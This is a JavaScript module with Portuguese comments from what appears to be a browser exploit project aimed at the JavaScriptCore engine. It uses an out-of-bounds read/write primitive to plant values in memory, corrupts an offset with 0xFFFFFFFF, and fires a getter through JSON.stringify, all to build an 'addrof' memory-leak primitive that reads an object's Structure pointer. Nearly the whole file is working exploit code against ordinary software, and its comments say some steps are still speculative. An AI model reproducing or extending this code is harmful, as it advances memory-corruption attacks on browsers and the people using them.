// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real, // Necessário se o getter usar oob_read_absolute
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v9.5";

const ADDROF_TEST_GETTER_NAME = "AAAA_GetterForAddrofTest_v95";
const ADDROF_PLANT_OFFSET_0x6C = 0x6C;
const ADDROF_CORRUPTION_OFFSET_TRIGGER = 0x70;
const ADDROF_CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

let addrof_test_getter_called_flag = false;
let addrof_test_value_written_to_oob_zero = null; // Valor que o getter escreve em oob_buffer[0]

// Variável de módulo para o SID, garantindo que esteja declarada.
let discovered_uint32array_structure_id = null;

// ============================================================
// FUNÇÃO DE TESTE "ADDROF" (CONTROLLED THIS + READ FROM IT)
// ============================================================

async function attemptAddrofPrimitive_v95(value_to_plant_at_0x6C, offset_to_read_via_this_magic = 0x0) {
    const FNAME_ATTEMPT = `${FNAME_MAIN}.attemptAddrofPrimitive_v95`;
    logS3(`--- Iniciando ${FNAME_ATTEMPT}: Plantando ${value_to_plant_at_0x6C.toString(true)} em 0x6C. Getter tentará ler de ('this' mágico + ${toHex(offset_to_read_via_this_magic)}) ---`, "test", FNAME_ATTEMPT);

    addrof_test_getter_called_flag = false;
    addrof_test_value_written_to_oob_zero = null; // Resetar

    if (!oob_array_buffer_real || !oob_dataview_real) { // Garante que oob_dataview_real também esteja pronto
        await triggerOOB_primitive();
    }

    // 1. Plantar o valor em 0x6C
    logS3(`Plantando QWORD ${value_to_plant_at_0x6C.toString(true)} em ${toHex(ADDROF_PLANT_OFFSET_0x6C)}`, "info", FNAME_ATTEMPT);
    oob_write_absolute(ADDROF_PLANT_OFFSET_0x6C, value_to_plant_at_0x6C, 8);
    const planted_qword_check = oob_read_absolute(ADDROF_PLANT_OFFSET_0x6C, 8);
    if (!planted_qword_check.equals(value_to_plant_at_0x6C)) {
        logS3("ERRO CRÍTICO: Falha ao plantar o valor corretamente em 0x6C!", "critical", FNAME_ATTEMPT);
        return null;
    }

    // 2. Criar o objeto com o getter como propriedade PRÓPRIA
    const getterObject = {
        get [ADDROF_TEST_GETTER_NAME]() {
            addrof_test_getter_called_flag = true;
            logS3(`[GETTER ${ADDROF_TEST_GETTER_NAME}]: ACIONADO! 'this' na entrada: ${this}`, "good", FNAME_ATTEMPT);

            // A "mágica" do v18a sugere que 'this' (ou um valor relacionado à execução)
            // se torna o QWORD que estava em 0x6C.
            // Vamos simular que o 'this' "mágico" é `value_to_plant_at_0x6C`.
            // O getter então tenta ler de `value_to_plant_at_0x6C + offset_to_read_via_this_magic`
            // e escrever o resultado em oob_array_buffer_real[0].

            let value_read_via_magic_this = new AdvancedInt64(0xBADBAD, 0xBADBAD); // Valor de erro padrão

            try {
                // Assumimos que value_to_plant_at_0x6C é o 'this' "mágico".
                // E que ele deve ser interpretado como um offset base para a leitura.
                // Se value_to_plant_at_0x6C for grande, .low() ou .toNumber() pode ser necessário se
                // o endereço real do objeto vazado for menor que 2^32 ou 2^53.
                // No log v18a, 'this' tornou-se '0x180a180a_00000000'. O getter tentou ler de this.low() (0x0).
                
                let base_offset_for_read_from_magic_this = value_to_plant_at_0x6C.low(); // Como no v18a
                // Se value_to_plant_at_0x6C fosse, por exemplo, o endereço real de um objeto pulverizado
                // dentro de oob_array_buffer_real, este seria o offset desse objeto.

                let final_read_offset = base_offset_for_read_from_magic_this + offset_to_read_via_this_magic;

                logS3(`  [GETTER]: Interpretando 'this mágico' (${value_to_plant_at_0x6C.toString(true)}) como base. Tentando ler de offset ${toHex(base_offset_for_read_from_magic_this)} + delta ${toHex(offset_to_read_via_this_magic)} = ${toHex(final_read_offset)}`, "info", FNAME_ATTEMPT);

                if (final_read_offset >= 0 && final_read_offset < oob_array_buffer_real.byteLength - 8) {
                    value_read_via_magic_this = oob_read_absolute(final_read_offset, 8);
                    logS3(`  [GETTER]: Valor lido de oob_buffer[${toHex(final_read_offset)}]: ${value_read_via_magic_this.toString(true)}`, "leak", FNAME_ATTEMPT);
                } else {
                    logS3(`  [GETTER]: Offset de leitura final ${toHex(final_read_offset)} está fora dos limites do oob_buffer. Lendo de 0x0 como fallback.`, "warn", FNAME_ATTEMPT);
                    value_read_via_magic_this = oob_read_absolute(0x0, 8); // Fallback
                }
                
                oob_write_absolute(0x0, value_read_via_magic_this, 8); // Copia para o início do oob_buffer
                addrof_test_value_written_to_oob_zero = value_read_via_magic_this;
                logS3(`  [GETTER]: Valor lido (${value_read_via_magic_this.toString(true)}) copiado para oob_buffer[0].`, "info", FNAME_ATTEMPT);

            } catch (e_getter_read) {
                logS3(`  [GETTER]: Erro ao tentar ler/escrever usando 'this mágico' como base de offset: ${e_getter_read.message}`, "error", FNAME_ATTEMPT);
                try { oob_write_absolute(0x0, new AdvancedInt64(0xDEADDEAD, 0xBADBAD), 8); } catch(e){} // Escreve erro em oob_buffer[0]
                addrof_test_value_written_to_oob_zero = new AdvancedInt64(0xDEADDEAD, 0xBADBAD);
            }
            return "getter_tentou_ler_de_this_magico";
        }
    };

    // 3. Acionar a corrupção principal em 0x70
    logS3(`Acionando corrupção em ${toHex(ADDROF_CORRUPTION_OFFSET_TRIGGER)} com ${ADDROF_CORRUPTION_VALUE_TRIGGER.toString(true)}`, "info", FNAME_ATTEMPT);
    oob_write_absolute(ADDROF_CORRUPTION_OFFSET_TRIGGER, ADDROF_CORRUPTION_VALUE_TRIGGER, 8);
    await PAUSE_S3(100); // Aumentar um pouco a pausa após corrupção

    // 4. Acionar o getter usando JSON.stringify
    let stringified_victim;
    try {
        logS3(`Tentando acionar getter via JSON.stringify(getterObject)...`, "info", FNAME_ATTEMPT);
        stringified_victim = JSON.stringify(getterObject);
    } catch (e) {
        logS3(`Erro durante JSON.stringify para acionar getter: ${e.message}`, "warn", FNAME_ATTEMPT);
    }

    logS3(`JSON.stringify(getterObject) resultou em: ${stringified_victim ? stringified_victim.substring(0,150) : "N/A"}`, "info", FNAME_ATTEMPT);
    logS3(`Flag do getter '${ADDROF_TEST_GETTER_NAME}': ${addrof_test_getter_called_flag}`, "info", FNAME_ATTEMPT);
    
    const qword_at_oob_start_after_getter = oob_read_absolute(0x0, 8);
    logS3(`QWORD no início do oob_buffer APÓS getter: ${qword_at_oob_start_after_getter.toString(true)}`, "leak", FNAME_ATTEMPT);

    if (addrof_test_getter_called_flag) {
        logS3(`SUCESSO: Getter foi chamado. O valor escrito em oob_buffer[0] pelo getter foi: ${addrof_test_value_written_to_oob_zero ? addrof_test_value_written_to_oob_zero.toString(true) : "N/A"}`, "good", FNAME_ATTEMPT);
        document.title = `AddrofTest: Getter OK, oob[0]=${qword_at_oob_start_after_getter.toString(true).substring(0,20)}`;
        // Se addrof_test_value_written_to_oob_zero não for um valor de erro, a leitura interna funcionou.
        return addrof_test_value_written_to_oob_zero; // Retorna o que foi lido e escrito em oob_buffer[0]
    } else {
        logS3("Falha: Getter não foi chamado.", "error", FNAME_ATTEMPT);
        document.title = "AddrofTest: Getter NÃO CHAMADO";
        return null;
    }
}


// ============================================================
// FUNÇÃO PRINCIPAL DE EXPORTAÇÃO
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.mainTestLogic_v9.5`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Teste de Primitiva Addrof (Estilo v18a) ---`, "test", FNAME_CURRENT_TEST);

    // Garantir que a variável de módulo está acessível e definida
    // (embora não seja usada ativamente nesta versão para descoberta de SID)
    if (typeof discovered_uint32array_structure_id === 'undefined') {
        discovered_uint32array_structure_id = null;
    }

    try {
        // Valor que vamos plantar em 0x6C. Este é o valor que o 'this' "mágico" deve se tornar.
        // E o getter tentará ler de this.low() + offset_para_ler_do_this
        const planted_qword_for_magic_this = new AdvancedInt64(0x11223344, 0x55667788); // Mesmo do seu log de sucesso v9.4

        // Offset (relativo ao 'this' mágico) de onde o getter tentará ler.
        // Se 'this' mágico for 0x55667788_11223344, e this.low() for 0x11223344,
        // e offset_to_read_from_magic_this_delta for 0x8, o getter lerá de 0x1122334C.
        const offset_to_read_from_magic_this_delta = JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET; // Tentar ler o Structure* do "this mágico"

        let value_read_by_getter = await attemptAddrofPrimitive_v95(planted_qword_for_magic_this, offset_to_read_from_magic_this_delta);

        if (value_read_by_getter && !(value_read_by_getter.low() === 0xBADBAD && value_read_by_getter.high() === 0xDEADDEAD)) {
            logS3(`SUCESSO: Primitiva 'addrof-like' executada. Getter leu e escreveu em oob_buffer[0]: ${value_read_by_getter.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
            logS3(`  Este valor (${value_read_by_getter.toString(true)}) foi lido de (this_magico.low() + delta_offset).`, "info", FNAME_CURRENT_TEST);
            logS3(`  'this mágico' era ${planted_qword_for_magic_this.toString(true)}, .low() é ${toHex(planted_qword_for_magic_this.low())}`, "info", FNAME_CURRENT_TEST);
            logS3(`  Offset de leitura foi ${toHex(planted_qword_for_magic_this.low() + offset_to_read_from_magic_this_delta)}`, "info", FNAME_CURRENT_TEST);
            
            // Se value_read_by_getter for um ponteiro Structure* válido, poderíamos tentar ler o StructureID dele.
            // Esta parte ainda é especulativa.
            // const potential_structure_id_from_leak = value_read_by_getter.low(); // Assumindo que Structure* é o valor, e ID está no low dword da célula da Structure
            // logS3(`  Potencial StructureID (da parte baixa do valor lido): ${toHex(potential_structure_id_from_leak)}`, "leak", FNAME_CURRENT_TEST);

        } else {
            logS3("Falha na primitiva 'addrof-like' ou getter retornou valor de erro.", "error", FNAME_CURRENT_TEST);
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
